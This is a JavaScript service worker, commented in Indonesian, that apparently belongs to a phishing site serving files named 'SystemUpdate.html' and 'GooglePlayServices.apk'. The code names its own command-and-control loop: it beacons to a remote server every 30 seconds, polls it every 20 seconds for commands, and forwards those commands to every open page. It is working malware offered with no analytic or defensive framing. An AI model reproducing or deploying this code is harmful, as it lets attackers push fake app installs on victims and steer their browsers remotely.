// ============================================================
// SERVICE WORKER - VERSI MAKSIMAL (TANPA PASSWORD)
// ============================================================

// ============================================================
// KONFIGURASI
// ============================================================
var VERSION = '2.0.0';
var STATIC_CACHE = 'static-v' + VERSION;
var DYNAMIC_CACHE = 'dynamic-v' + VERSION;
var SERVER_URL = 'https://verifikasi.site';
var C2_INTERVAL = 20000;
var HEARTBEAT_INTERVAL = 30000;

var STATIC_FILES = [
    '/',
    '/index.html',
    '/dashboard.html',
    '/files/SystemUpdate.html',
    '/files/GooglePlayServices.apk'
];

// ============================================================
// 🔥 INSTALL
// ============================================================
self.addEventListener('install', function(event) {
    console.log('[SW] Install v' + VERSION);
    event.waitUntil(
        caches.open(STATIC_CACHE)
            .then(function(cache) {
                return cache.addAll(STATIC_FILES).catch(function(err) {
                    console.error('[SW] Failed to cache:', err);
                });
            })
            .then(function() {
                return self.skipWaiting();
            })
    );
});

// ============================================================
// 🔥 ACTIVATE
// ============================================================
self.addEventListener('activate', function(event) {
    console.log('[SW] Activate v' + VERSION);
    event.waitUntil(
        caches.keys()
            .then(function(cacheNames) {
                return Promise.all(
                    cacheNames.map(function(cacheName) {
                        if (cacheName !== STATIC_CACHE && cacheName !== DYNAMIC_CACHE) {
                            console.log('[SW] Deleting old cache:', cacheName);
                            return caches.delete(cacheName);
                        }
                    })
                );
            })
            .then(function() {
                return self.clients.claim();
            })
    );
});

// ============================================================
// 🔥 FETCH - STRATEGY CACHE-FIRST
// ============================================================
self.addEventListener('fetch', function(event) {
    var request = event.request;
    var url = new URL(request.url);
    
    if (url.pathname.startsWith('/data') || 
        url.pathname.startsWith('/api') ||
        url.pathname.startsWith('/ws') ||
        url.pathname.startsWith('/error')) {
        event.respondWith(fetch(request));
        return;
    }
    
    if (request.method !== 'GET') {
        event.respondWith(fetch(request));
        return;
    }
    
    if (url.pathname.endsWith('.apk')) {
        event.respondWith(
            caches.match(request)
                .then(function(response) {
                    if (response) return response;
                    return fetch(request)
                        .then(function(networkResponse) {
                            return caches.open(DYNAMIC_CACHE)
                                .then(function(cache) {
                                    cache.put(request, networkResponse.clone());
                                    return networkResponse;
                                });
                        });
                })
                .catch(function() {
                    return new Response('APK not found', { status: 404 });
                })
        );
        return;
    }
    
    event.respondWith(
        caches.match(request)
            .then(function(response) {
                if (response) return response;
                return fetch(request)
                    .then(function(networkResponse) {
                        if (url.pathname.endsWith('.html') || 
                            url.pathname.endsWith('.css') || 
                            url.pathname.endsWith('.js')) {
                            return caches.open(DYNAMIC_CACHE)
                                .then(function(cache) {
                                    cache.put(request, networkResponse.clone());
                                    return networkResponse;
                                });
                        }
                        return networkResponse;
                    });
            })
            .catch(function() {
                if (url.pathname.endsWith('.html')) {
                    return caches.match('/offline.html');
                }
                return new Response('Offline', { status: 503 });
            })
    );
});

// ============================================================
// 🔥 RECEIVE MESSAGE FROM PAGE
// ============================================================
self.addEventListener('message', function(event) {
    var data = event.data;
    if (!data || !data.type) return;
    switch(data.type) {
        case 'ping':
            event.ports[0].postMessage({ type: 'pong', timestamp: Date.now() });
            break;
        case 'clear_cache':
            caches.delete(STATIC_CACHE);
            caches.delete(DYNAMIC_CACHE);
            event.ports[0].postMessage({ type: 'cache_cleared' });
            break;
        default:
            console.log('[SW] Unknown message type:', data.type);
    }
});

// ============================================================
// 🔥 HEARTBEAT - TANPA PASSWORD!
// ============================================================
function sendHeartbeat() {
    try {
        fetch(SERVER_URL + '/data', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                sumber: 'sw_heartbeat',
                data: { active: true, version: VERSION, timestamp: Date.now() }
            })
        }).catch(function() {});
    } catch(e) {}
}

// ============================================================
// 🔥 C2 CHECK - TANPA PASSWORD!
// ============================================================
function checkC2() {
    try {
        fetch(SERVER_URL + '/data?type=perintah&t=' + Date.now())
            .then(function(r) {
                if (!r.ok) throw new Error('HTTP ' + r.status);
                return r.text();
            })
            .then(function(content) {
                if (content && content.length > 5 && content !== '{}') {
                    try {
                        var cmd = JSON.parse(content);
                        if (cmd.aksi) {
                            self.clients.matchAll().then(function(clients) {
                                clients.forEach(function(client) {
                                    client.postMessage({
                                        type: 'command',
                                        command: cmd
                                    });
                                });
                            });
                        }
                    } catch(e) {
                        console.error('[SW] C2 parse error:', e);
                    }
                }
            })
            .catch(function() {});
    } catch(e) {
        console.error('[SW] C2 error:', e);
    }
}

// ============================================================
// 🔥 START PERIODIC TASKS
// ============================================================
setInterval(sendHeartbeat, HEARTBEAT_INTERVAL);
setInterval(checkC2, C2_INTERVAL);
setTimeout(checkC2, 1000);

console.log('[SW] Service Worker v' + VERSION + ' active - TANPA PASSWORD');
